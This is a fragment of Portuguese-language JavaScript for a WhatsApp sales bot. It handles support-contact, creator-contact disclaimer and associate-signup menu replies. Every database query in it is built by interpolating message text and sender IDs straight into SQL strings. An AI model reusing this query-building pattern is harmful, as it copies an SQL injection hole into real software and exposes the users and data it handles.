                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "🔙 MENU",
                    description: "Menu incial.",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("👤 CONTATO DO SUPORTE") > -1) {
            TEXTO_SUPORTE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_SUPORTE'`).get()["VALOR"]
            Texto = `👤 *CONTATO DO SUPORTE* 👤

⚠️ *ESTE É O NÚMERO DO RESPONSÁVEL OU SUPORTE DESTE BOT*

⚠️ *QUALQUER ASSUNTO REFERENTE AO MATERIAL VENDIDO E ETC... ENTRE EM CONTATO APENAS COM ESTE NÚMERO*

${TEXTO_SUPORTE}
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("🛠️ CONTATO DO CRIADOR DO BOT") > -1) {

            // await client.sendPtt(Mensagem_From, './Misc/ContatoCriador.mp3').then(async (result) => {
            // }).catch(async(erro) => {
            //     console.error('Error when sending: ', erro);
            // });
            // return

            CONSTRUCAO_LISTMESSAGE_buttonText = "CONTATO DO CRIADOR"
            CONSTRUCAO_LISTMESSAGE_title = `PENSE BEM...`
            CONSTRUCAO_LISTMESSAGE_description = `🛠️ *CONTATO DO CRIADOR DO BOT* 🛠️

⚠️ *ATENÇÃO ANTES DE CONTATA-LO* ⚠️

O Desenvolvedor não possui responsabilidade alguma sobre este Bot e nem sobre o adm do mesmo, caso entre em contato para reclamar sobre material ou pedir para chamar o adm deste Bot ou algo do tipo, será bloqueado de imediato... Apenas o Chame, caso queira conhecer nossos Bots.

*MESMO ASSIM QUER ENTRAR EM CONTATO?*`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "✅ SIM, QUERO O CONTATO DO CRIADOR",
                    description: " ",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "❌ NÃO QUERO MAIS O CONTATO",
                    description: " ",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("✅ SIM, QUERO O CONTATO DO CRIADOR") > -1) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "CONTATO DO CRIADOR"
            CONSTRUCAO_LISTMESSAGE_title = `PENSE BEM...`
            CONSTRUCAO_LISTMESSAGE_description = `*VOCÊ ESTÁ CIENTE DE SE CASO RECLAMAR SOBRE ALGUM MATERIAL VENDIDO NESSE BOT COM O CONTATO DO CRIADOR QUE NÃO É RESPONSÁVEL POR ISSO, VOCÊ SERÁ BLOQUEADO IMEDIANTAMENTE?*`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "✅ SIM, ESTOU CIENTE, QUERO MUITO O CONTATO",
                    description: " ",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "❌ NÃO SABIA, DEIXA PARA LÁ",
                    description: " ",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("✅ SIM, ESTOU CIENTE, QUERO MUITO O CONTATO") > -1) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "CONTATO DO CRIADOR"
            CONSTRUCAO_LISTMESSAGE_title = `PENSE BEM...`
            CONSTRUCAO_LISTMESSAGE_description = `*VOCÊ SERÁ BLOQUEADO DE QUALQUER BOT, PARA NUNCA MAIS INTERAGIR, CASO ENTRE EM CONTATO COM O CRIADOR DE BOTS PARA RECLAMAR DE ALGO QUE COMPROU E NÃO FUNCIONOU...*

O CRIADOR E SUA EQUIPE SÓ ALUGAM BOTS!! NÃO TEMOS NADA A VER COM OQUE VOCÊ COMPROU NESTE BOT!!!!!!!`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "✅ TABOM, CHEGA JÁ ENTENDI",
                    description: " ",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "❌ DESCULPA EU QUERIA RECLAMAR SIM",
                    description: " ",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("✅ TABOM, CHEGA JÁ ENTENDI") > -1) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "CONTATO DO CRIADOR"
            CONSTRUCAO_LISTMESSAGE_title = `PENSE BEM...`
            CONSTRUCAO_LISTMESSAGE_description = `*SE VOCÊ CHEGOU ATÉ AQUI, VOCÊ ESTÁ CIENTE DISTO TUDO:*

#Se eu estou com algum problema no bot, eu vou na opção *CONTATO DO SUPORTE* e não vou levar nenhum problema ao criador de bots.

#Comprei um material que não funciona, mas sei que o criador não tem responsabilidade e sim o dono do bot que se encontra no contato do suporte.

#Estou ciente que serei bloqueado imediatamente se eu entrar em contato com o criador para falar de assuntos sobre este bot.

#Se o contato do suporte não me responde, vou esperar ou desistir, mas não vou falar com o criador sobre isso, pois ele só aluga Bots.
`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "✅ CERTO, ESTOU CIENTE DE TUDO",
                    description: " ",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "❌ VOCÊS SÃO CHATOS, EU SÓ QUERIA RESOLVER MEU PROBLEMA NO BOT",
                    description: " ",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("✅ CERTO, ESTOU CIENTE DE TUDO") > -1) {

            Texto = `O Criador se chama *Rimuru Dev.*

Membros da equipe são:

*Rimuru Dev* 💜
*Shion Assistente* 💙
*Mestre dos Magos* ❤️

Aqui está o contato Equipe *Rimuru Group.*

*SUPORTE RIMURU* - wa.me/${Numero_Suporte_Plan}`

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("💼 TORNE-SE UM ASSOCIADO") > -1 || Mensagem_Texto.toString() === "/associado") {
            TEXTO_TORNE_ASSO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_TORNE_ASSO'`).get()["VALOR"]

            TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
            if ((TIPOMENU_ATUAL).toString() === "a") {

                CONSTRUCAO_LISTMESSAGE_buttonText = "TORNE-SE UM ASSOCIADO"
                CONSTRUCAO_LISTMESSAGE_title = `TORNE-SE UM ASSOCIADO`
                CONSTRUCAO_LISTMESSAGE_description = TEXTO_TORNE_ASSO

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "✅ QUERO SER UM ASSOCIADO",
                        description: " ",
                    },
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "❌ RECUSAR",
                        description: " ",
                    }
                )
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `*TORNE-SE UM ASSOCIADO*

${TEXTO_TORNE_ASSO}


✅ *QUERO SER UM ASSOCIADO*
Digite /querosociedade`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
